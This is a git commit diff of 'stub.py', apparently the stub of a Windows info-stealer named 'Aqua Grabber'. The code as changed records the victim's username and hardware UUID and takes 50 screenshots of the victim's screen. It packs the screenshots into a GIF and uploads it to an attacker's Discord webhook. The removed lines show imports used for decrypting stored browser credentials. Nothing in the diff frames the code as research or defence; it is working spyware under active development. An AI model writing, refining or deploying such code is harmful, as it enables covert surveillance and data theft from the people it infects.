b20a92e4e7eff745faa4ee969db3bf1a72b3c91d
anoncx <108609556+anoncx@users.noreply.github.com>
2023-12-03 22:08:46 +0100

    OK FIXED SS

--- stub.py
+++ stub.py
@@ -1,27 +1,19 @@
 import os
-import random
-import subprocess
-import socket
-import base64
-import json
-import os
 import shutil
-import sqlite3
-import sys
-import zipfile
+
 import glob
+import subprocess
+
 from PIL import Image
-import win32com.client
-
-from datetime import datetime, timedelta
-
-import cv2
-from Crypto.Cipher import AES
-from win32crypt import CryptUnprotectData
 from discord_webhook import DiscordWebhook, DiscordEmbed
 from mss import mss
 
 user = os.environ.get("USERNAME")
+
+
+def get_HWID():
+    current_machine_id = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()
+    return current_machine_id
 
 
 def makeDir():
@@ -32,9 +24,9 @@ def makeDir():
 
 
 def takeSS():
-    with mss() as sct:
-        for i in range(50):
-            sct.shot(mon=-1, output=f"C:/Users/Public/Aqua/{i}.png")
+    for i in range(50):
+        with mss() as sct:
+            sct.shot(mon=-1, output=f"C:/Users/Public/Aqua/ss/{i}.png")
             print(f"Done SS Number {i}")
 
     frame_folder = f'C:/Users/Public/Aqua/ss'
@@ -43,12 +35,12 @@ def takeSS():
         frames = [Image.open(image) for image in glob.glob(f"{frame_folder}/*")]
         frame_one = frames[0]
         frame_one.save(f"C:/Users/Public/Aqua/ss/SS.gif", format="GIF", append_images=frames,
-                       save_all=True, duration=5, loop=1)
+                       save_all=True, duration=100, loop=1)
 
     make_gif()
     with open(f'C:/Users/Public/Aqua/ss/SS.gif', 'rb') as f:
         file_data = f.read()
-    webhook.content = f'```{user} | ScreenShot | HWID: {get_id()}```'
+    webhook.content = f'```{user} | ScreenShot | HWID: {get_HWID()}```'
     webhook.add_file(file_data, f'Aqua_{user}_SS.gif')
     print("Done")
     webhook.execute()
@@ -67,7 +59,9 @@ webhook.username = "Aqua Grabber"
 
 
 def runAqua():
+    makeDir()
     takeSS()
     cleanUp()
+
 
 runAqua()
